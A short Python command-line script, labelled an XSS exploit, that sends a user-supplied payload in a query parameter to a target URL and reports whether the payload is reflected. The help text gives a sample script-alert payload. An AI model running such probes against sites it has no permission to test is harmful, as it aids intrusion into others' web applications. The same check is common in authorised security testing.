import argparse
import requests
import logging


def xss_attack(target_url, param, payload):
    """
    Perform an XSS attack.
    :param target_url: Target URL.
    :param param: Vulnerable parameter.
    :param payload: XSS payload.
    """
    logging.info(f"Starting XSS attack on {target_url} with parameter: {param}")
    try:
        response = requests.get(target_url, params={param: payload}, timeout=5)
        if payload in response.text:
            logging.info(f"XSS vulnerability detected on {target_url} with payload: {payload}")
            return response.text
        else:
            logging.info(f"No XSS vulnerability detected on {target_url}")
    except Exception as e:
        logging.error(f"Error during XSS attack: {e}")

    return "XSS attack failed."


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Cross-Site Scripting (XSS) Exploit")
    parser.add_argument("--target", required=True, help="Target URL (e.g., http://example.com/vulnerable_endpoint)")
    parser.add_argument("--param", required=True, help="Vulnerable parameter name (e.g., search, input)")
    parser.add_argument("--payload", required=True, help="XSS payload (e.g., <script>alert('XSS')</script>)")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO)
    result = xss_attack(args.target, args.param, args.payload)
    print(result)
